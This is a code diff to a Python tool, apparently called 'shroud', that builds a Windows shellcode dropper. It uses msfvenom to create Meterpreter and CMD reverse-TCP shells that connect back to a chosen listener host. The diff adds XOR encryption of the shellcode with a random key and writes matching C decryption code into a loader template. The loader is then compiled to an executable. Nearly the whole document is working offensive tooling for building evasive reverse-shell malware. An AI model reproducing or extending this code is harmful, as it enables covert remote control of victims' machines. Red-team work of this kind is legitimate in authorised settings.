@@ -2,6 +2,7 @@
 import argparse
 import subprocess
 import os
+from itertools import cycle
 
 print("""
 .▄▄ ·  ▄ .▄▄▄▄        ▄• ▄▌·▄▄▄▄  
@@ -37,9 +38,9 @@ def generateTemplate():
 		print("[-] Listener IP and port are required for templates.")
 		exit()
 	if args.msf: # Meterpreter shell
-		subprocess.run(["msfvenom","-p","windows/x64/meterpreter/reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
+		subprocess.run(["msfvenom","-p","windows/x64/meterpreter_reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
 	if args.shell: # CMD shell
-		subprocess.run(["msfvenom","-p","windows/x64/shell/reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
+		subprocess.run(["msfvenom","-p","windows/x64/shell_reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
 	return
 
 # Compile to binary
@@ -57,6 +58,27 @@ def compile():
 		print("WIP1")
 	return
 
+def xorList(key):
+
+	keyLine = "\tBYTE pKey[] = { "
+	for i in range(0,len(key)):
+		if i != len(key)-1:
+			keyLine += f"0x{key[i].to_bytes(1).hex()}, "
+		else:
+			keyLine += f"0x{key[i].to_bytes(1).hex()} " + "};\n"
+
+	blob = keyLine + f"""
+	for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {{
+		if (j >= {len(key)})
+		{{
+			j = 0;
+		}}
+		pPayload[i] = pPayload[i] ^ pKey[j];
+	}}
+	"""
+	return blob
+
+
 def readShellcode(filePath):
 
 	shellcode = []
@@ -69,10 +91,10 @@ def readShellcode(filePath):
 
 	return shellcode
 
-def writePayload(shellcode):
+def writePayload(shellcode, key, iv=None):
 
 	# Read in current runner
-	mainFileR = open("./src/main.c", "r")
+	mainFileR = open("./setup/template.c", "r")
 	mainLines = mainFileR.readlines()
 	mainFileR.close()
 	
@@ -86,9 +108,9 @@ def writePayload(shellcode):
 			line = "\tBYTE pPayload[] = { "
 			for j in range(0,len(shellcode)):
 				if j != len(shellcode)-1:
-					line += f"0x{shellcode[j].hex()}, "
+					line += f"0x{shellcode[j].to_bytes(1).hex()}, "
 				else:
-					line += f"0x{shellcode[j].hex()}" + " };\n"
+					line += f"0x{shellcode[j].to_bytes(1).hex()}" + " };\n"
 		
 		# Update size line
 		if "SIZE_T sPayloadSize" in line:
@@ -97,12 +119,31 @@ def writePayload(shellcode):
 
 		newLines.append(line)
 
+	# Update decryption protocol
+	for i in range(0,len(newLines)):
+		if "SIZE_T sPayloadSize" in newLines[i]:
+			if args.xor:
+				newLines[i+1:i+1] = xorList(key)
+
 	# Write to runner
 	with open("./src/main.c", mode="wt", encoding="utf-8") as mainFileW:
 		for line in newLines:
 			mainFileW.write(line)
 	
 	return
+
+
+def encryptXOR(shellcode):
+
+	key = os.urandom(32) # XOR KEY LENGTH!
+	byteString = b''.join(shellcode)
+	encrypted = bytes(a ^ b for a, b in zip(byteString, cycle(key)))
+	encList = []
+	for byte in encrypted:
+		encList.append(byte.to_bytes(1))
+
+	return encrypted, key
+
 
 def main():
 	# Generate templates if necessary
@@ -115,11 +156,14 @@ def main():
 		shellcode = readShellcode(args.file)
 
 	# Encrypt payload (check xor and don't-encrypt)
-	
+	print("[~] Encrypting payload...")
+	if args.xor:
+		shellcode, key  = encryptXOR(shellcode)
+
 
 	# Update dropper file wrapper (update payload, process name, export)
 	print("[~] Writing payload to dropper...")
-	writePayload(shellcode)
+	writePayload(shellcode, key)
 
 	# Compile (x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./src/* -o ./output/shroud.exe)
 	print("[~] Compiling...")
